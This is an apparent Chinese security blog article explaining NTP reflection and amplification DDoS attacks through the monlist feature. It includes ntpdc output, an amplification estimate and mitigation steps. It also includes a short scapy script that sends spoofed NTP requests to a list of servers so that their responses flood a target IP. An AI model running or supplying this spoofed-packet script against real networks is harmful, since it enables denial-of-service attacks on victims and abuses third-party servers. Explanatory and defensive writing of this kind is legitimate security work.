# 浅谈基于 NTP 的反射和放大攻击

0x01 一些案例
---------

* * *

最近一段时间 DDoS 攻击事件让基于 NTP 的 DDoS 攻击变得很火热，先看看下面的信息感受下：

> “It was a very large DDoS targeting a CloudFlare customer,” Matthew Prince, CEO of Cloudflare told SecurityWeek. “We're still gathering the log data to get exact numbers but know it was well over 300Gbps and likely over 400Gbps,” Prince said.
> 
> “The method was NTP reflection, which is quickly replacing DNS reflection as the source of the largest attacks,” Prince said.

消息中称 CloudFlare 遭受了高达 400G 流量的 NTP 反射攻击，目前从网上各处的消息来看，众说纷纭，我们先不去考证消息的真伪，仅仅从攻击方法和流量方面来看着实体现出 NTP 反射攻击的威力。

0x02 什么是 NTP
------------

* * *

NTP 是网络时间协议（Network Time Protocol）的简称，干嘛用的呢？就是通过网络协议使计算机之前的时间同步化。

0x03 NTP 反射和放大攻击
----------------

* * *

那什么是 NTP 反射和放大攻击呢？如果听过 DNS 反射和放大攻击的话应该就会对这个比较容易理解了，协议不同，效果一样。

我们先来说说放射和放大攻击：

无论是基于 DNS 还是基于 NTP，其最终都是基于 UDP 协议的。在 UDP 协议中正常情况下客户端发送请求包到服务端，服务端返回响应包到客户端，但是 UDP 协议是面向无连接的，所以客户端发送请求包的源 IP 很容易进行伪造，当把源 IP 修改为受害者的 IP，最终服务端返回的响应包就会返回到受害者的 IP。这就形成了一次反射攻击。

放大攻击呢就是一次小的请求包最终会收到一个或者多个多于请求包许多倍的响应包，这样就达到了四两拨千斤的效果。

那我们接着来看什么是 NTP 的反射和放大攻击，NTP 包含一个 monlist 功能，也被成为 MON_GETLIST，主要用于监控 NTP 服务器，NTP 服务器响应 monlist 后就会返回与 NTP 服务器进行过时间同步的最后 600 个客户端的 IP，响应包按照每 6 个 IP 进行分割，最多有 100 个响应包。

我们可以通过 ntpdc 命令向一个 NTP 服务器发送 monlist 以及结合抓包来看下实际的效果。

> pangzi@pangzi-mac ~$ ntpdc -n -c monlist x.x.x.x | wc -l
> 
> 602

![NTP wireshark](http://drops.javaweb.org/uploads/images/d067a90b330c02cddf9701e94b8e648575c213cc.jpg)

在上面的命令行中我们可以看到一次含有 monlist 的请求收到 602 行数据，除去头两行是无效数据外，正好是 600 个客户端 IP 列表，并且从上面图中的 wireshark 中我们也看到显示有 101 个 NTP 协议的包，除去一个请求包，正好是 100 个响应包。

从上图中我们可以看到请求包的大小为 234 字节，每个响应包为 482 字节，如果单纯按照这个数据我们可以计算出放大的倍数是：482*100/234 = 206 倍。其实如果通过编写攻击脚本，请求包会更小，这个倍数值会更大，这样算起来是不是蛮屌的。

0x04 如何利用
---------

* * *

我们通过 scapy 实现一个简单的攻击脚本，代码如下：

```
#!/usr/bin/env python
# author: pangzi.me@gmail.com

import sys
from scapy.all import *

def attack(target, ntp_server):
    send(IP(dst=ntp_server, src=target)/(UDP(sport=52816)/NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    target = sys.argv[1]
    ntp_server_file = sys.argv[2]
    for ntp_server in open(ntp_server_file, "r"):
        ntp_server = ntp_server.strip()
        if ntp_server != "":
            attack(target, ntp_server)

```

0x05 如何防御
---------

* * *

我们可以分为两种情况进行防御

#### 加固 NTP 服务

```
1. 把 NTP 服务器升级到 4.2.7p26
2. 关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加`disable monitor`选项
3. 在网络出口封禁 UDP 123 端口

```

#### 防御 NTP 反射和放大攻击

```
1. 由于这种攻击的特征比较明显，所以可以通过网络层或者借助运营商实施 ACL 来防御
2. 使用防 DDoS 设备进行清洗

```

不过我觉得如果流量真的够大，400G？800G？或者更大，又有谁能够防得住呢？